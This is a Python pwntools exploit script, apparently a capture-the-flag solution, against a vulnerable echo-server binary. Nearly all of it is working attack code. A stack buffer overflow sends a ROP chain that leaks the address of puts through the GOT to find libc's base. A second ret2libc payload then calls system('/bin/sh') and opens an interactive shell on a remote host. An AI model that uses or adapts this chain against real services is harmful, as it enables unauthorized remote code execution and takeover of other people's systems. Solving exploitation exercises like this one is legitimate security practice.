#!/usr/bin/env python3

from pwn import *
import base64

e = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([e.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("192.168.1.1", 1337)

    return r


def main():
    r = conn()
    rbp_offset = 128
    rip_offset = rbp_offset + 8

    pop_rdi_ret = 0x400913

    puts_got = e.got['puts']
    puts_plt = e.plt['puts']
    main = e.symbols['main']

    info(hex(puts_got))
    info(hex(puts_plt))
    info(hex(main))

    payload = b'A' * rip_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
    r.sendlineafter('WeLcOmE To mY EcHo sErVeR!', payload)
    trash = r.recvline()
    trash = r.recvline()
    data = r.recvline()
    leaked_puts = u64(data[:-1].ljust(8,b'\x00'))
    info(f"PUTS LEAK: {hex(leaked_puts)}")
    #data = r.recvuntil(b"\nWeLcOmE")
    #info(hex(u64(leaked_bytes)))

    libc_base   = leaked_puts - libc.symbols['puts']
    libc.address = libc_base

    info(f"LIBC BASE: {hex(libc_base)}")

    sh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]
    exit = libc.sym["exit"]

    ret = 0x40052e
    # good luck pwning :)

    payload = b"A" * rip_offset
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(sh)
    payload += p64(system)
    payload += p64(0x0)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

